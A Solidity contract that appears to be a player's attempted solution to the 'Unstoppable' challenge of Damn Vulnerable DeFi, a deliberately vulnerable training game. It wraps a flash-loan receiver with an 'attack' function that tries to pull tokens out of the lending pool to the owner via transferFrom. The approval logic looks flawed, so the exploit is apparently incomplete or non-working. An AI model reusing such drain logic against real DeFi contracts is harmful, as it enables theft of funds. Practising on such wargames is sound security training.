// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

 interface Pool {
    function flashLoan(uint256 borrowAmount) external;
    function depositTokens(uint256 amount) external ;
 }
contract FakeReceiverUnstoppable {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        // Return all tokens to the pool
      
        //uint256 balance = IERC20(tokenAddress).balanceOf(msg.sender);
        require(IERC20(tokenAddress).approve(address(owner), amount), "Approve of tokens failed");
        require(IERC20(tokenAddress).approve(address(this), amount), "Approve of tokens failed");

        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
        //Pool(msg.sender).depositTokens(balance);
    }

    function attack(address tokenAddress, uint256 amount) external {
        //uint256 balance = IERC20(tokenAddress).balanceOf(address(pool));
        require(IERC20(tokenAddress).transferFrom(address(pool), address(owner), amount), "Transfer of tokens failed");      
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}